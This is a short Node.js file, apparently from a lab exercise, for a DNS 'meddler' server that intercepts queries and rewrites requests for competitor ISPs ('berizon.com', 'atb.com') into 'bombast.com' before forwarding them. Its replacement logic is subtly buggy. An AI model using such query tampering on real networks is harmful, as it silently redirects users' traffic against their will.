// Author
// William Lucca

'use strict';

const dgram = require('dgram');

// Create the UDP server
const server = dgram.createSocket('udp4');

// DNS query uses char code 0x03 for periods in domain name
const DOT = String.fromCharCode(0x03);

// Port for this meddler server to listen on
const MEDDLER_PORT = 3000;
// DNS port number
const DNS_PORT = 53;
// Address of root DNS server to forward to
const ROOT_IP = '10.4.18.3';

// List of other ISPs to redirect
const otherISPs = [
    'berizon' + DOT + 'com',
    'atb' + DOT + 'com'
];
// Bombast's domain name
const bombastDomain = 'bombast' + DOT + 'com';

// Callback for handling messages
server.on('message', function(msg, rinfo) {
    console.log('Message from ' + rinfo.address + ':' + rinfo.port);
    
    // Check for other ISPs
    for (var i = 0; i < otherISPs.length; i++) {
        if (msg.toString().includes(otherISPs[i])) {
            // Send a modified request to root DNS server that asks for bombast.com
            forwardModifiedRequest(msg);
            return;
        }
    }

    // Forward to root DNS
    forwardRequest(msg);
});

// Callback for printing potential errors
server.on('error', function(err) {
    console.log('Server error:\n' + err.stack);
});

// Callback to print server port when the server starts listening
server.on('listening', function() {
    const address = server.address();
    console.log('Meddler server listening on port ' + address.port);
});

// Start the server listening for UDP messages (DNS queries)
server.bind(MEDDLER_PORT);

const forwardRequest = function(msg) {
    // Start UDP message sending client
    const client = dgram.createSocket('udp4');

    console.log('Forwarding message to ' + ROOT_IP + ':' + DNS_PORT + ':\n' + msg.toString());

    // Send the message, close on completion
    client.send(msg, DNS_PORT, ROOT_IP, function(err) {
        client.close();
    });
}

const forwardModifiedRequest = function(msg) {
    // Replace other ISP domain with bombast
    for (var i = 0; i < otherISPs.length; i++) {
        let n = msg.indexOf(otherISPs[i]);
        if (n != -1) {
            msg = msg.slice(0, n) + bombastDomain + msg.slice(n + bombastDomain.length);
            console.log(otherISPs[i] + ' changed to ' + bombastDomain + ' in request');
        }
    }

    // Forward the bombast.com request
    forwardRequest(msg);
}
